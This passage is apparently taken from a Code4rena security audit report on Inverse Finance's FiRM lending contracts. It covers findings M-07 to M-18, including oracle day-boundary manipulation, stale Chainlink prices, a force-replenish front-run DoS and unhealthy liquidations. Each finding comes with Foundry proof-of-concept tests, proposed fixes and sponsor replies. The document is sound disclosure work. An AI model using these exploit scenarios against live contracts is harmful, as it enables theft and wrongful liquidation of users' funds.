User should pay all the remaining escrow balance if the calculated liquidation fee is greater than its escrow balance.

        if(liquidationFeeBps > 0) {

            uint liquidationFee = repaidDebt * 1 ether / price * liquidationFeeBps / 10000;

            if(escrow.balance() >= liquidationFee) {

                escrow.pay(gov, liquidationFee);

            } else {

                escrow.pay(gov, escrow.balance());

            }

        }
0xean (judge) commented:

This should amount to dust.

08xmt (Inverse) confirmed and commented:

Fixed in https://github.com/InverseFinance/FrontierV2/pull/15.

[M-07] Oracle’s two-day feature can be gamed
Submitted by Ruhum

Oracle.sol#L124

The two-day feature of the oracle can be gamed where you only have to manipulate the oracle for ~2 blocks.

Proof of Concept
The oracle computes the day using:

uint day = block.timestamp / 1 days;
Since we’re working with uint values here, the following is true:
1728799 / 86400 = 1
172800 / 86400 = 2

Meaning, if you manipulate the oracle at the last block of day X, e.g. 23:59:50, and at the first block of day X + 1, e.g. 00:00:02, you bypass the two-day feature of the oracle. You only have to manipulate the oracle for two blocks.

This is quite hard to pull off. I’m also not sure whether there were any instances of Chainlink oracle manipulation before. But, since you designed this feature to prevent small timeframe oracle manipulation I think it’s valid to point this out.

Recommended Mitigation Steps
If you increase it to a three-day interval you can fix this issue. Then, the oracle has to be manipulated for at least 24 hours.

08xmt (Inverse) acknowledged and commented:

This is an issue if a 24 hour period elapses without any calls to the oracle and the underlying oracle is manipulable. The two day low is meant to be an added layer of security, but not bullet proof.

[M-08] Protocol withdrawals of collateral can be unexpectedly locked if governance sets the collateralFactorBps to 0
Submitted by trustindistrust, also found by cryptonue, d3e4, pashov, eierina, pedroais, RaoulSchaffranek, c7e7eff, simon135, Jujic, catchup, 0xbepresent, jwood, Lambda, peanuts, and codexploder

https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L359
https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L376

The FiRM Marketplace contract contains multiple governance functions for setting important values for a given debt market. Many of these are numeric values that affect ratios/levels for debt positions, fees, incentives, etc.

In particular, Market.setCollateralFactorBps() sets the ratio for how much collateral is required for loans vs the debt taken on by the user. The lower the value, the less debt a user can take on. See Market.getCreditLimitInternal() for that implementation.

The function Market.getWithdrawalLimitInternal() calculates how much collateral a user can withdraw from the protocol, factoring in their current level of debt. It contains the following check:

if(collateralFactorBps == 0) return 0;

This would cause the user to not be able to withdraw any tokens, so long as they had any non-0 amount of debt and the collateralFactorBps was 0.

Severity Rationalization
It is the warden’s estimation that all semantics for locking functionality of the protocol should be explicit rather than implicit. While it is very unlikely that governance would intentionally set this value to 0, if it were to do so it would disproportionately affect users whose debt values were low compared to their deposited collateral.

It is also obvious that the same function that set the value to 0 could be used to revert the change. However, this would take time. Inverse Finance has mandatory minimums for the time required to process governance items in its workflow (https://docs.inverse.finance/inverse-finance/governance/creating-a-proposal)

The community has a social agreement to post all proposals on the forum and as a draft in GovMills at least 24 hours before the proposal is put up for an on-chain vote, and also to host a community call focusing on the proposal before the voting period.

Once a proposal has passed, it must be queued on-chain. This action can be triggered by anyone who is willing to pay the gas fee (usually done by a DAO member). The proposal then enters a holding period of 40 hours to allow users time to prepare for the consequences of the execution of the proposal.

As such, were the situation to occur it would cause at least 64 hours of lock.

Since the contract itself only overtly contains locking for new borrowing, this implicit lock on withdraws seems like an unnecessary risk.

Recommended Mitigation Steps
Consider a minimum for this value, to go along with the maximum value check already present in the setter function. While this will still reduce the quantity of collateral that can be withdrawn by users, it would allow for some withdraws to occur.

An explicit withdrawal lock could be implemented, making the semantic clear. This function could have modified access controls to enable faster reactions vs governance alone.

Alternatively, if there was an intention for this value to accept 0, consider an ‘escape hatch’ function that could be enacted by users when a ‘defaulted’ state is set on the Market.

08xmt (Inverse) disputed and commented:

This is functioning as intended. Setting a low collateralFactor like this is essentially a way to force borrowers to repay their debt. It may be a necessary operation in an emergency.

[M-09] Avoidable misconfiguration could lead to INVEscrow contract not minting xINV tokens
Submitted by neumo, also found by minhtrng, ladboy233, BClabs, and rvierdiiev

Market.sol#L281-L283

If a user creates a market with the INVEscrow implementation as escrowImplementation and false as callOnDepositCallback, the deposits made by users in the escrow (through the market) would not mint xINV tokens for them. As callOnDepositCallback is an immutable variable set in the constructor, this mistake would make the market a failure and the user should deploy a new one (even worse, if the error is detected after any user has deposited funds, some sort of migration of funds should be needed).

Proof of Concept
Both escrowImplementation and callOnDepositCallback are immutable:

...

address public immutable escrowImplementation;

...

bool immutable callOnDepositCallback;

...
and its value is set at creation:

constructor (

        address _gov,

        address _lender,

        address _pauseGuardian,

        address _escrowImplementation,

        IDolaBorrowingRights _dbr,

        IERC20 _collateral,

        IOracle _oracle,

        uint _collateralFactorBps,

        uint _replenishmentIncentiveBps,

        uint _liquidationIncentiveBps,

        bool _callOnDepositCallback

    ) {

	...

	escrowImplementation = _escrowImplementation;

	...

	callOnDepositCallback = _callOnDepositCallback;

	...

 }
When the user deposits collateral, if callOnDepositCallback is true, there is a call to the escrow’s onDeposit callback:

function deposit(address user, uint amount) public {

	...

	if(callOnDepositCallback) {

		escrow.onDeposit();

	}

	emit Deposit(user, amount);

}
This is INVEscrow’s onDeposit function:

function onDeposit() public {

	uint invBalance = token.balanceOf(address(this));

	if(invBalance > 0) {

		xINV.mint(invBalance); // we do not check return value because we don't want errors to block this call

	}

}
The thing is if callOnDepositCallback is false, this function is never called and the user does not turn his/her collateral (INV) into xINV.

Recommended Mitigation Steps
Either make callOnDepositCallback a configurable parameter in Market.sol or always call the onDeposit callback (just get rid of the callOnDepositCallback variable) and leave it empty in case there’s no extra functionality that needs to be executed for that escrow. In the case that the same escrow has to execute the callback for some markets and not for others, this solution would imply that there should be two escrows, one with the callback to be executed and another with the callback empty.

08xmt (Inverse) acknowledged, but disagreed with severity and commented:

Fixed in https://github.com/InverseFinance/FrontierV2/pull/21/commits/0d4b01c594fb56a9f0ba944f6946874a5b335152

We acknowledge that markets can be configured incorrectly, but it should generally be assumed that markets will be configured correctly, as this will go through both internal and governance review.

[M-10] Liquidation should make a borrower healthier
Submitted by hansfriese

https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L559
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L591

For a lending pool, borrower’s debt healthness can be decided by the health factor, i.e. the collateral value divided by debt. ($C/D$)

The less the health factor is, the borrower’s collateral is more risky of being liquidated.

Liquidation is supposed to make the borrower healthier (by paying debts and claiming some collateral), or else continuous liquidations can follow up and this can lead to a so-called liquidation crisis.

In a normal lending protocol, borrower’s debt is limited by collateral factor in any case.

For this protocol, users can force replenishment for the addresses in deficit and the replenishment increases the borrower’s debt.

And in the current implementation the replenishment is limited so that the new debt is not over than the collateral value.

As we will see below, this limitation is not enough and if the borrower’s debt is over some threshold (still less than collateral value), liquidation makes the borrower debt “unhealthier”.

And repeating liquidation can lead to various problems and we will even show an example that the attacker can take the DOLA out of the market.

Proof of Concept
Please see warden’s original submission for full proof of concept.

Tools Used
Foundry

Recommended Mitigation Steps
Make sure the liquidation does not decrease the health index in the function liquidate.
With this mitigation, we also suggest limiting the debt increase in the function forceReplenish so that the new debt after replenish will not be over the threshold.

function liquidate(address user, uint repaidDebt) public {

    require(repaidDebt > 0, "Must repay positive debt");

    uint debt = debts[user];

    require(getCreditLimitInternal(user) < debt, "User debt is healthy");

    require(repaidDebt <= debt * liquidationFactorBps / 10000, "Exceeded liquidation factor");


    // ****************************************

    uint beforeHealthFactor = getCollateralValue(user) * 1e18 / debt; // @audit remember the health factor before liquidation

    // ****************************************


    uint price = oracle.getPrice(address(collateral), collateralFactorBps); // collateral price in dola

    uint liquidatorReward = repaidDebt * 1 ether / price; // collateral amount

    liquidatorReward += liquidatorReward * liquidationIncentiveBps / 10000;

    debts[user] -= repaidDebt;

    totalDebt -= repaidDebt;


    dbr.onRepay(user, repaidDebt);

    dola.transferFrom(msg.sender, address(this), repaidDebt);

    IEscrow escrow = predictEscrow(user);

    escrow.pay(msg.sender, liquidatorReward);

    if(liquidationFeeBps > 0) {

        uint liquidationFee = repaidDebt * 1 ether / price * liquidationFeeBps / 10000;

        if(escrow.balance() >= liquidationFee) {

            escrow.pay(gov, liquidationFee);

        }

    }


    // ****************************************

    uint afterHealthFactor = getCollateralValue(user) * 1e18 / debts[user]; // @audit health factor after liquidation

    require(afterHealthFactor >= beforeHealthFactor, "Liquidation should not decrease the health factor of the address"); // @audit new check

    // ****************************************


    emit Liquidate(user, msg.sender, repaidDebt, liquidatorReward);

}


function forceReplenish(address user, uint amount) public {

    uint deficit = dbr.deficitOf(user);

    require(deficit > 0, "No DBR deficit");

    require(deficit >= amount, "Amount > deficit");

    uint replenishmentCost = amount * dbr.replenishmentPriceBps() / 10000;

    uint replenisherReward = replenishmentCost * replenishmentIncentiveBps / 10000;

    debts[user] += replenishmentCost;

    uint collateralValue = getCollateralValueInternal(user);


    // ****************************************

    // require(collateralValue >= debts[user], "Exceeded collateral value");

    require(collateralValue >= debts[user] * (1 + liquidationIncentiveBps / 10000 + liquidationFeeBps / 10000), "Debt exceeds safe collateral limit"); // @audit more strict limit

    // ****************************************


    totalDebt += replenishmentCost;

    dbr.onForceReplenish(user, amount);

    dola.transfer(msg.sender, replenisherReward);

    emit ForceReplenish(user, msg.sender, amount, replenishmentCost, replenisherReward);

}
08xmt (Inverse) confirmed and commented:

Fixed by https://github.com/InverseFinance/FrontierV2/pull/22.

0xean (judge) decreased severity and commented:

I think this comes down to design tradeoffs and is not unique to this specific lending protocol. It certainly shouldn’t be consider High risk, but could see it being considered Medium as users should be aware that in market sell offs, cascading liquidations are a potential reality either due to liquidation rewards OR simply declining prices and the feedback loop at liquidations occur.

That being said, these items are not unique to this protocol, so perhaps QA is a better grade for this issue.

0xean (judge) commented:

@08xmt - care to weigh in on this one? I am unable to see your fix, but may help in how I judge it. The warden asked me to re-review and is suggesting a Medium severity.

08xmt (Inverse) commented:

@0xean - I think a Medium rating is fair. Our fix has been to revert when the combination of Collateral Factor, Liquidation Incentive and Liquidation Fee would result in profitable self liquidations or unhealthier debt after liquidations.

        if(collateralFactorBps > 0){

            uint unsafeLiquidationIncentive = 10000 * 10000 / collateralFactorBps - 10000 - liquidationFeeBps;

            require(liquidationIncentiveBps < unsafeLiquidationIncentive,  "New liquidation param allow profitable self liquidation");

        }
0xean (judge) increased severity to Medium and commented:

Thanks, will upgrade back to Medium. :)

[M-11] viewPrice doesn’t always report dampened price
Submitted by Jeiwan

Oracle.sol#L91

Oracle’s viewPrice function doesn’t report a dampened price until getPrice is called and today’s price is updated. This will impact the public read-only functions that call it:

getCollateralValue;
getCreditLimit (calls getCollateralValue);
getLiquidatableDebt (calls getCreditLimit);
getWithdrawalLimit.
These functions are used to get on-chain state and prepare values for write calls (e.g. calculate withdrawal amount before withdrawing or calculate a user’s debt that can be liquidated before liquidating it). Thus, wrong values returned by these functions can cause withdrawal of a wrong amount or liquidation of a wrong debt or cause reverts.

Proof of Concept
// src/test/Oracle.t.sol

function test_viewPriceNoDampenedPrice_AUDIT() public {

    uint collateralFactor = market.collateralFactorBps();

    uint day = block.timestamp / 1 days;

    uint feedPrice = ethFeed.latestAnswer();


    //1600e18 price saved as daily low

    oracle.getPrice(address(WETH), collateralFactor);

    assertEq(oracle.dailyLows(address(WETH), day), feedPrice);


    vm.warp(block.timestamp + 1 days);

    uint newPrice = 1200e18;

    ethFeed.changeAnswer(newPrice);

    //1200e18 price saved as daily low

    oracle.getPrice(address(WETH), collateralFactor);

    assertEq(oracle.dailyLows(address(WETH), ++day), newPrice);


    vm.warp(block.timestamp + 1 days);

    newPrice = 3000e18;

    ethFeed.changeAnswer(newPrice);


    //1200e18 should be twoDayLow, 3000e18 is current price. We should receive dampened price here.

    // Notice that viewPrice is called before getPrice.

    uint viewPrice = oracle.viewPrice(address(WETH), collateralFactor);

    uint price = oracle.getPrice(address(WETH), collateralFactor);

    assertEq(oracle.dailyLows(address(WETH), ++day), newPrice);


    assertEq(price, 1200e18 * 10_000 / collateralFactor);


    // View price wasn't dampened.

    assertEq(viewPrice, 3000e18);

}
Recommended Mitigation Steps
Consider this change:

--- a/src/Oracle.sol

+++ b/src/Oracle.sol

@@ -89,6 +89,9 @@ contract Oracle {

             uint day = block.timestamp / 1 days;

             // get today's low

             uint todaysLow = dailyLows[token][day];

+            if(todaysLow == 0 || normalizedPrice < todaysLow) {

+                todaysLow = normalizedPrice;

+            }

             // get yesterday's low

             uint yesterdaysLow = dailyLows[token][day - 1];

             // calculate new borrowing power based on collateral factor
0xean (judge) commented:

Well written report that explains the impact of this unlike the others. Will leave open for review.

08xmt (Inverse) confirmed and commented:

Fixed in https://github.com/InverseFinance/FrontierV2/pull/18.

[M-12] Users could get some DOLA even if they are on liquidation position
Submitted by Ch_301

Market.sol#L566

Users able to invoke forceReplenish() when they are on liquidation position.

Proof of Concept
On Market.sol ==> forceReplenish()
On this line

uint collateralValue = getCollateralValueInternal(user);
getCollateralValueInternal(user) only return the value of the collateral

    function getCollateralValueInternal(address user) internal returns (uint) {

        IEscrow escrow = predictEscrow(user);

        uint collateralBalance = escrow.balance();

        return collateralBalance * oracle.getPrice(address(collateral), collateralFactorBps) / 1 ether; 
So if the user have 1.5 wETH at the price of 1 ETH = 1600 USD
It will return 1.5 * 1600 and this value is the real value we can’t just check it directly with the debt like this

 require(collateralValue >= debts[user], "Exceeded collateral value");
This is no longer over collateralized protocol.
The value needs to be multiplied by collateralFactorBps / 10000

So depending on the value of collateralFactorBps and liquidationFactorBps the user could be in the liquidation position but he is able to invoke forceReplenish() to cover all their dueTokensAccrued[user] on DBR.sol and get more DOLA
or it will lead a healthy debt to be in the liquidation position after invoking forceReplenish()
*
Recommended Mitigation Steps
Use getCreditLimitInternal() rather than getCollateralValueInternal().

0xean (judge) commented:

I believe this warden may be correct in the fact that we should actually be adding the collateralFactor into the check.

08xmt (Inverse) commented:

While increasing debt beyond the Credit limit do risk creating bad debt, this bad debt is owed entirely to the protocol. If one wanted to minimise the amount of bad debt created this way, it would be possible to change the line to getCollateralValueInternal() * (10000 - liquidationIncentiveBps) / 10000;, as this would also slightly reduce the amount of bad debt paid out to force replenishers as incentives.

08xmt (Inverse) confirmed and commented:

https://github.com/InverseFinance/FrontierV2/pull/17.

Added a variant of this solution: https://github.com/code-423n4/2022-10-inverse-findings/issues/419#issuecomment-1313694712.

[M-13] Market::forceReplenish can be DoSed
Submitted by immeas

Market.sol#L562

If a user wants to completely forceReplenish a borrower with deficit, the borrower or any other malicious party can front run this with a dust amount to prevent the replenish.

Proof of Concept
    function testForceReplenishFrontRun() public {

        gibWeth(user, wethTestAmount);

        gibDBR(user, wethTestAmount / 14);

        uint initialReplenisherDola = DOLA.balanceOf(replenisher);


        vm.startPrank(user);

        deposit(wethTestAmount);

        uint borrowAmount = getMaxBorrowAmount(wethTestAmount);

        market.borrow(borrowAmount);

        uint initialUserDebt = market.debts(user);

        uint initialMarketDola = DOLA.balanceOf(address(market));

        vm.stopPrank();


        vm.warp(block.timestamp + 5 days);

        uint deficitBefore = dbr.deficitOf(user);

        vm.startPrank(replenisher);


        market.forceReplenish(user,1); // front run DoS


        vm.expectRevert("Amount > deficit");

        market.forceReplenish(user, deficitBefore); // fails due to amount being larger than deficit

        

        assertEq(DOLA.balanceOf(replenisher), initialReplenisherDola, "DOLA balance of replenisher changed");

        assertEq(DOLA.balanceOf(address(market)), initialMarketDola, "DOLA balance of market changed");

        assertEq(DOLA.balanceOf(replenisher) - initialReplenisherDola, initialMarketDola - DOLA.balanceOf(address(market)),

            "DOLA balance of market did not decrease by amount paid to replenisher");

        assertEq(dbr.deficitOf(user), deficitBefore-1, "Deficit of borrower was not fully replenished");


        // debt only increased by dust

        assertEq(market.debts(user) - initialUserDebt, 1 * replenishmentPriceBps / 10000, "Debt of borrower did not increase by replenishment price");

    }
This requires that the two txs end up in the same block. If they end up in different blocks the front run transaction will need to account for the increase in deficit between blocks.

Tools Used
vscode, forge

Recommended Mitigation Steps
Use min(deficit,amount) as amount to replenish.

0xean (judge) commented:

Very similar to #439 and unclear as the benefit the attacker is gaining here. They would be better off just front running the entire transaction and getting additional reward. Will leave open for sponsor review, but most likely QA or invalid.

08xmt (Inverse) confirmed and commented:

Fixed in https://github.com/InverseFinance/FrontierV2/pull/16.
Possible to imagine a situation where an attacker has an underwater loan and keeps front running his own forced replenishments with single digit DBR forced replenishments.

[M-14] Two day low oracle used in Market.liquidate() makes the system highly at risk in an oracle attack
Submitted by gs8nrv, also found by immeas, yamapyblack, idkwhatimdoing, kaden, Holmgren, and rvierdiiev

https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L596
https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L594
https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L597

Usage of the 2 day low exchange rate when trying to liquidate is highly risky as it incentives even more malicious agents to control the price feed for a short period of time. By controlling shortly the feed, it puts at risk any debt opened for a 2 day period + the collateral released will be overshoot during the liquidation.

Proof of Concept
The attack can be done by either an attack directly on the feed to push bad data, or in the case of Chainlink manipulating for a short period of time the markets to force an update from Chainlink. Then when either of the attacks has been made the attacker call Oracle.getPrice(). It then gives a 2 day period to the attacker (and any other agent who wants to liquidate) to liquidate any escrow.

This has a second drawback, we see that we use the same value at line 596, which is used to compute the liquidator reward (l.597), leading to more collateral released than expected. For instance manipulating once the feed and bring the ETH/USD rate to 20 instead of 2000, liquidator will earn 100 more than he should have had.

Recommended Mitigation Steps
Instead of using the 2 day lowest price during the liquidation, the team could either take the current oracle price, while still using the 2 day period for any direct agent interaction to minimise attacks both from users side and liquidators side.

0xean (judge) decreased severity to Medium

08xmt (Inverse) disputed and commented:

The debt is not more at risk than through normal oracle manipulation. The oracle will return the normalized price if it’s lower than the dampened two-day low, meaning oracle manipulations can always be used for bad liquidations.

[M-15] Oracle assumes token and feed decimals will be limited to 18 decimals
Submitted by adriro, also found by pashov, sorrynotsorry, neumo, Chom, CertoraInc, Ruhum, eierina, Lambda, RaoulSchaffranek, cryptphi, codexploder, BClabs, 8olidity, and joestakey

https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L87
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L121

The Oracle contract normalizes prices in both viewPrices and getPrices functions to adjust for potential decimal differences between feed and token decimals and the expected return value.

However these functions assume that feedDecimals and tokenDecimals won’t exceed 18 since the normalization calculation is 36 - feedDecimals - tokenDecimals, or that at worst case the sum of both won’t exceed 36.

This assumption should be safe for certain cases, for example WETH is 18 decimals and the ETH/USD chainlink is 8 decimals, but may cause an overflow (and a revert) for the general case, rendering the Oracle useless in these cases.

Proof of Concept
If feedDecimals + tokenDecimals > 36 then the expression 36 - feedDecimals - tokenDecimals will be negative and (due to Solidity 0.8 default checked math) will cause a revert.

Recommended Mitigation Steps
In case feedDecimals + tokenDecimals exceeds 36, then the proper normalization procedure would be to divide the price by 10 ** decimals. Something like this:

uint normalizedPrice;


if (feedDecimals + tokenDecimals > 36) {

    uint decimals = feedDecimals + tokenDecimals - 36;

    normalizedPrice = price / (10 ** decimals)

} else {

    uint8 decimals = 36 - feedDecimals - tokenDecimals;

    normalizedPrice = price * (10 ** decimals);

}
08xmt (Inverse) confirmed and commented:

Fixed in https://github.com/InverseFinance/FrontierV2/pull/25
Also pretty sure this is a dupe

[M-16] Calling repay function sends less DOLA to Market contract when forceReplenish function is not called while it could be called
Submitted by rbserver, also found by Picodes, Ch_301, Jeiwan, ElKu, 0xRobocop, MiloTruck, and sam_cunningham

When a user incurs a DBR deficit, a replenisher can call the forceReplenish function to force the user to replenish DBR. However, there is no guarantee that the forceReplenish function will always be called. When the forceReplenish function is not called, such as because that the replenisher does not notice the user’s DBR deficit promptly, the user can just call the repay function to repay the origianl debt and the withdraw function to receive all of the deposited collateral even when the user has a DBR deficit already. Yet, in the same situation, if the forceReplenish function has been called, more debt should be added for the user, and the user needs to repay more in order to get back all of the deposited collateral. Hence, when the forceReplenish function is not called while it could be called, the Market contract would receive less DOLA if the user decides to repay the debt and withdraw the collateral both in full.

https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L559-L572

    function forceReplenish(address user, uint amount) public {

        uint deficit = dbr.deficitOf(user);

        require(deficit > 0, "No DBR deficit");

        require(deficit >= amount, "Amount > deficit");

        uint replenishmentCost = amount * dbr.replenishmentPriceBps() / 10000;

        uint replenisherReward = replenishmentCost * replenishmentIncentiveBps / 10000;

        debts[user] += replenishmentCost;

        uint collateralValue = getCollateralValueInternal(user);

        require(collateralValue >= debts[user], "Exceeded collateral value");

        totalDebt += replenishmentCost;

        dbr.onForceReplenish(user, amount);

        dola.transfer(msg.sender, replenisherReward);

        emit ForceReplenish(user, msg.sender, amount, replenishmentCost, replenisherReward);

    }
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L531-L539

    function repay(address user, uint amount) public {

        uint debt = debts[user];

        require(debt >= amount, "Insufficient debt");

        debts[user] -= amount;

        totalDebt -= amount;

        dbr.onRepay(user, amount);

        dola.transferFrom(msg.sender, address(this), amount);

        emit Repay(user, msg.sender, amount);

    }
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L472-L474

    function withdraw(uint amount) public {

        withdrawInternal(msg.sender, msg.sender, amount);

    }
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L460-L466

    function withdrawInternal(address from, address to, uint amount) internal {

        uint limit = getWithdrawalLimitInternal(from);

        require(limit >= amount, "Insufficient withdrawal limit");

        IEscrow escrow = getEscrow(from);

        escrow.pay(to, amount);

        emit Withdraw(from, to, amount);

    }
Proof of Concept
Please add the following test in src\test\Market.t.sol. This test will pass to demonstrate the described scenario.

    function testRepayAndWithdrawInFullWhenIncurringDBRDeficitIfNotBeingForcedToReplenish() public {

        gibWeth(user, wethTestAmount);

        gibDBR(user, wethTestAmount);


        vm.startPrank(user);


        // user deposits wethTestAmount WETH and borrows wethTestAmount DOLA

        deposit(wethTestAmount);

        market.borrow(wethTestAmount);


        assertEq(DOLA.balanceOf(user), wethTestAmount);

        assertEq(WETH.balanceOf(user), 0);


        vm.warp(block.timestamp + 60 weeks);


        // after some time, user incurs DBR deficit

        assertGt(dbr.deficitOf(user), 0);


        // yet, since no one notices that user has a DBR deficit and forces user to replenish DBR,

        //   user is able to repay wethTestAmount DOLA that was borrowed previously and withdraw wethTestAmount WETH that was deposited previously

        market.repay(user, wethTestAmount);

        market.withdraw(wethTestAmount);


        vm.stopPrank();


        // as a result, user is able to get back all of the deposited WETH, which should not be possible if user has been forced to replenish DBR

        assertEq(DOLA.balanceOf(user), 0);

        assertEq(WETH.balanceOf(user), wethTestAmount);

    }
Tools Used
VSCode

Recommended Mitigation Steps
When calling the repay function, the user’s DBR deficit can also be checked. If the user has a DBR deficit, an amount, which is similar to replenishmentCost that is calculated in the forceReplenish function, can be calculated; it can then be used to adjust the repay function’s amount input for updating the states regarding the user’s and total debts in the relevant contracts.

08xmt (Inverse) disputed and commented:

Working as intended.

[M-17] Chainlink oracle data feed is not sufficiently validated and can return stale price
Submitted by rbserver, also found by d3e4, TomJ, pashov, sorrynotsorry, Aymen0909, c7e7eff, horsefacts, pedroais, minhtrng, dipp, 0xc0ffEE, Chom, immeas, imare, Olivierdem, Jeiwan, cccz, hansfriese, bin2chen, elprofesor, __141345__, tonisives, catchup, 0xNazgul, Rolezn, Ruhum, Franfran, Wawrdog, idkwhatimdoing, carlitox477, Lambda, peanuts, saneryee, djxploit, eierina, cuteboiz, martin, M4TZ1P, Jujic, rokinot, ladboy233, codexploder, 0x1f8b, joestakey, leosathya, rvierdiiev, and 8olidity

Calling the Oracle contract’s viewPrice or getPrice function executes uint price = feeds[token].feed.latestAnswer() and require(price > 0, "Invalid feed price"). Besides that Chainlink’s latestAnswer function is deprecated, only verifying that price > 0 is true is also not enough to guarantee that the returned price is not stale. Using a stale price can cause the calculations for the credit and withdrawal limits to be inaccurate, which, for example, can mistakenly consider a user’s debt to be under water and unexpectedly allow the user’s debt to be liquidated.

To avoid using a stale answer returned by the Chainlink oracle data feed, according to Chainlink’s documentation:

The latestRoundData function can be used instead of the deprecated latestAnswer function.
roundId and answeredInRound are also returned. “You can check answeredInRound against the current roundId. If answeredInRound is less than roundId, the answer is being carried over. If answeredInRound is equal to roundId, then the answer is fresh.”
“A read can revert if the caller is requesting the details of a round that was invalid or has not yet been answered. If you are deriving a round ID without having observed it before, the round might not be complete. To check the round, validate that the timestamp on that round is not 0.”
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L78-L105

    function viewPrice(address token, uint collateralFactorBps) external view returns (uint) {

        if(fixedPrices[token] > 0) return fixedPrices[token];

        if(feeds[token].feed != IChainlinkFeed(address(0))) {

            // get price from feed

            uint price = feeds[token].feed.latestAnswer();

            require(price > 0, "Invalid feed price");

            // normalize price

            uint8 feedDecimals = feeds[token].feed.decimals();

            uint8 tokenDecimals = feeds[token].tokenDecimals;

            uint8 decimals = 36 - feedDecimals - tokenDecimals;

            uint normalizedPrice = price * (10 ** decimals);

            uint day = block.timestamp / 1 days;

            // get today's low

            uint todaysLow = dailyLows[token][day];

            // get yesterday's low

            uint yesterdaysLow = dailyLows[token][day - 1];

            // calculate new borrowing power based on collateral factor

            uint newBorrowingPower = normalizedPrice * collateralFactorBps / 10000;

            uint twoDayLow = todaysLow > yesterdaysLow && yesterdaysLow > 0 ? yesterdaysLow : todaysLow;

            if(twoDayLow > 0 && newBorrowingPower > twoDayLow) {

                uint dampenedPrice = twoDayLow * 10000 / collateralFactorBps;

                return dampenedPrice < normalizedPrice ? dampenedPrice: normalizedPrice;

            }

            return normalizedPrice;


        }

        revert("Price not found");

    }
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L112-L144

    function getPrice(address token, uint collateralFactorBps) external returns (uint) {

        if(fixedPrices[token] > 0) return fixedPrices[token];

        if(feeds[token].feed != IChainlinkFeed(address(0))) {

            // get price from feed

            uint price = feeds[token].feed.latestAnswer();

            require(price > 0, "Invalid feed price");

            // normalize price

            uint8 feedDecimals = feeds[token].feed.decimals();

            uint8 tokenDecimals = feeds[token].tokenDecimals;

            uint8 decimals = 36 - feedDecimals - tokenDecimals;

            uint normalizedPrice = price * (10 ** decimals);

            // potentially store price as today's low

            uint day = block.timestamp / 1 days;

            uint todaysLow = dailyLows[token][day];

            if(todaysLow == 0 || normalizedPrice < todaysLow) {

                dailyLows[token][day] = normalizedPrice;

                todaysLow = normalizedPrice;

                emit RecordDailyLow(token, normalizedPrice);

            }

            // get yesterday's low

            uint yesterdaysLow = dailyLows[token][day - 1];

            // calculate new borrowing power based on collateral factor

            uint newBorrowingPower = normalizedPrice * collateralFactorBps / 10000;

            uint twoDayLow = todaysLow > yesterdaysLow && yesterdaysLow > 0 ? yesterdaysLow : todaysLow;

            if(twoDayLow > 0 && newBorrowingPower > twoDayLow) {

                uint dampenedPrice = twoDayLow * 10000 / collateralFactorBps;

                return dampenedPrice < normalizedPrice ? dampenedPrice: normalizedPrice;

            }

            return normalizedPrice;


        }

        revert("Price not found");

    }
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L344-L347

    function getCreditLimitInternal(address user) internal returns (uint) {

        uint collateralValue = getCollateralValueInternal(user);

        return collateralValue * collateralFactorBps / 10000;

    }
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L323-L327

    function getCollateralValueInternal(address user) internal returns (uint) {

        IEscrow escrow = predictEscrow(user);

        uint collateralBalance = escrow.balance();

        return collateralBalance * oracle.getPrice(address(collateral), collateralFactorBps) / 1 ether;

    }
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L353-L363

    function getWithdrawalLimitInternal(address user) internal returns (uint) {

        IEscrow escrow = predictEscrow(user);

        uint collateralBalance = escrow.balance();

        if(collateralBalance == 0) return 0;

        uint debt = debts[user];

        if(debt == 0) return collateralBalance;

        if(collateralFactorBps == 0) return 0;

        uint minimumCollateral = debt * 1 ether / oracle.getPrice(address(collateral), collateralFactorBps) * 10000 / collateralFactorBps;

        if(collateralBalance <= minimumCollateral) return 0;

        return collateralBalance - minimumCollateral;

    }
Proof of Concept
The following steps can occur for the described scenario.

Alice calls the depositAndBorrow function to deposit some WETH as the collateral and borrows some DOLA against the collateral.
Bob calls the liquidate function for trying to liquidate Alice’s debt. Because the Chainlink oracle data feed returns an up-to-date price at this moment, the getCreditLimitInternal function calculates Alice’s credit limit accurately, which does not cause Alice’s debt to be under water. Hence, Bob’s liquidate transaction reverts.
After some time, Bob calls the liquidate function again for trying to liquidate Alice’s debt. This time, because the Chainlink oracle data feed returns a positive but stale price, the getCreditLimitInternal function calculates Alice’s credit limit inaccurately, which mistakenly causes Alice’s debt to be under water.
Bob’s liquidate transaction is executed successfully so he gains some of Alice’s WETH collateral. Alice loses such WETH collateral amount unexpectedly because her debt should not be considered as under water if the stale price was not used.
Tools Used
VSCode

Recommended Mitigation Steps
Oracle.sol#L82-L83 and Oracle.sol#L116-L117 can be updated to the following code.

            (uint80 roundId, int256 answer, , uint256 updatedAt, uint80 answeredInRound) = feeds[token].feed.latestRoundData();

            require(answeredInRound >= roundId, "answer is stale");

            require(updatedAt > 0, "round is incomplete");

            require(answer > 0, "Invalid feed answer");


            uint256 price = uint256(answer);
08xmt (Inverse) confirmed and commented:

Fixed in https://github.com/InverseFinance/FrontierV2/pull/19

[M-18] Protocol’s usability becomes very limited when access to Chainlink oracle data feed is blocked
Submitted by rbserver

